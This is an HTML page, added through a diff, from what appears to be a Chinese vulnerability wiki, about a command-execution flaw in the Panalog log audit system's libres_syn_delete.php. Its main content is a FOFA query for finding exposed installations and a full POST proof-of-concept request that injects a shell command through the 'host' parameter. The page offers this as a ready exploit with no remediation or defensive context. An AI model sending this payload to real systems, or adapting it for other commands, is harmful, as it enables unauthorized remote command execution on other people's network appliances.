@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Panalog/Panalog%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9Flibres_syn_delete.php%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Panalog大数据日志审计系统libres syn delete.php存在命令执行 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Panalog\u5927\u6570\u636e\u65e5\u5fd7\u5ba1\u8ba1\u7cfb\u7edflibres_syn_delete.php\u5b58\u5728\u547d\u4ee4\u6267\u884c", url: "#_top", children: [
+          ]},
+          {title: "fofa", url: "#fofa", children: [
+          ]},
+          {title: "poc", url: "#poc", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E5%8C%97%E4%BA%AC%E6%B4%BE%E7%BD%91%E8%BD%AF%E4%BB%B6%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8Panabit-Panalog%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9Fsprog_upstatus.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E5%8C%97%E4%BA%AC%E6%B4%BE%E7%BD%91%E8%BD%AF%E4%BB%B6%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8Panabit-Panalog%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9Fsprog_upstatus.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        北京派网软件有限公司Panabit-Panalog大数据日志审计系统sprog_upstatus.php存在SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Panabit-iXCache/Panabit-iXCache%E7%BD%91%E5%85%B3RCE%E6%BC%8F%E6%B4%9ECVE-2023-38646/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Panabit-iXCache/Panabit-iXCache%E7%BD%91%E5%85%B3RCE%E6%BC%8F%E6%B4%9ECVE-2023-38646/" class="btn btn-xs btn-link">
+        Panabit iXCache网关RCE漏洞CVE 2023 38646
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="panaloglibres_syn_deletephp">Panalog大数据日志审计系统libres_syn_delete.php存在命令执行<a class="headerlink" href="#panaloglibres_syn_deletephp" title="Permanent link">&para;</a></h2>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>app=&quot;Panabit-Panalog&quot;
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<p><div class="highlight"><pre><span></span><code>POST /content-apply/libres_syn_delete.php HTTP/1.1
+Host: 
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+Content-Length: 54
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+
+token=1&amp;id=2&amp;host=|id &gt;2cWKiiWovWYAIcNUBPkZph4xPLs.txt
+</code></pre></div>
+<img alt="image" src="https://github.com/wy876/POC/assets/139549762/44588f4b-2c3a-45c6-bc27-951795c2d64b" /></p>
+<p><img alt="image" src="https://github.com/wy876/POC/assets/139549762/90d69ec6-1058-4563-b02f-0721a1c68e8f" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E5%8C%97%E4%BA%AC%E6%B4%BE%E7%BD%91%E8%BD%AF%E4%BB%B6%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8Panabit-Panalog%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9Fsprog_upstatus.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E5%8C%97%E4%BA%AC%E6%B4%BE%E7%BD%91%E8%BD%AF%E4%BB%B6%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8Panabit-Panalog%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9Fsprog_upstatus.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        北京派网软件有限公司Panabit-Panalog大数据日志审计系统sprog_upstatus.php存在SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Panabit-iXCache/Panabit-iXCache%E7%BD%91%E5%85%B3RCE%E6%BC%8F%E6%B4%9ECVE-2023-38646/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Panabit-iXCache/Panabit-iXCache%E7%BD%91%E5%85%B3RCE%E6%BC%8F%E6%B4%9ECVE-2023-38646/" class="btn btn-xs btn-link">
+        Panabit iXCache网关RCE漏洞CVE 2023 38646
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
